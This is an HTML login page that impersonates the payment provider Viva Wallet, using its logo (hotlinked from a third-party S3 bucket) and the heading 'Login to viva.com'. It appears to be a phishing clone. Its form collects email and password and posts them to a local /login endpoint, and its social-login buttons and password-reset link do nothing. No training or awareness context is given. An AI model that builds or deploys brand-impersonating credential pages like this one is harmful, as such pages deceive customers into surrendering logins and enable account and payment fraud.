<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login Page</title>
<style>
        body {
            font-family: Arial, sans-serif;
            background-color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            padding: 20px;
            width: 300px;
            text-align: center;
        }
        .login-container img {
            width: 150px;
            margin-bottom: 20px;
        }
        .login-container h1 {
            margin-bottom: 10px;
            font-size: 1.5em;
            color: black;
            font-weight: bold;
        }
        .login-container h2 {
            margin-bottom: 20px;
            font-size: 1em;
            color: black;
            font-weight: normal;
        }
        .login-container input[type="email"],
        .login-container input[type="password"],
        .login-container button {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 20px; /* More rounded buttons */
        }
        .login-container button {
            background-color: black;
            color: white;
            border: none;
            cursor: pointer;
            border-radius: 20px; /* Curved button */
        }
        .login-container button:hover {
            background-color: #333;
        }
        /* Styling for the row with Remember me and Forget password */
        .login-options {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 0.9em;
            margin: 10px 0;
        }
        .login-options .remember-me-container {
            display: flex;
            align-items: center;
        }
        .login-options .forgot-password {
            color: blue;
            text-decoration: none;
        }
        .login-options .forgot-password:hover {
            text-decoration: underline;
        }
        .login-options label {
            margin-left: 5px;
        }

        /* OR divider */
        .or-divider {
            margin: 20px 0;
            font-size: 0.9em;
            color: grey;
            display: flex;
            align-items: center;
        }
        .or-divider:before,
        .or-divider:after {
            content: "";
            flex: 1;
            height: 1px;
            background: #ccc;
        }
        .or-divider:before {
            margin-right: 10px;
        }
        .or-divider:after {
            margin-left: 10px;
        }

        /* Style for the continue buttons */
        .social-login-container {
            margin-top: 20px;
        }
        .social-login-container button {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #ccc;
            border-radius: 20px; /* Curved buttons */
            background-color: #f5f5f5;
            color: grey;
            font-size: 0.9em;
            cursor: pointer;
        }
        .social-login-container button:hover {
            background-color: #e0e0e0;
        }
</style>
</head>
<body>
<div class="login-container">
    <img src="https://s3-eu-west-1.amazonaws.com/tpd/logos/65cf8f430acd12f4ff464deb/0x0.png"
    alt="Viva Wallet Logo">
    <h1>Welcome back</h1>
    <h2>Login to viva.com</h2>
    <form action="/login" method="post">
        <input type="email" name="email" placeholder="Email or Mobile Number" required>
        <input type="password" name="password" placeholder="Password" required>

        <!-- Row with Remember me and Forget password -->
        <div class="login-options">
            <div class="remember-me-container">
                <input type="checkbox" id="rememberMe" name="rememberMe">
                <label for="rememberMe">Remember me</label>
            </div>
            <a href="#" class="forgot-password">Forget password?</a>
        </div>

        <button type="submit">Login</button>
    </form>

    <!-- OR divider -->
    <div class="or-divider">OR</div>

    <!-- Social login buttons -->
    <div class="social-login-container">
        <button type="button">Continue with Google</button>
        <button type="button">Continue with Apple</button>
        <button type="button">Continue with Microsoft</button>
    </div>
</div>
</body>
</html>
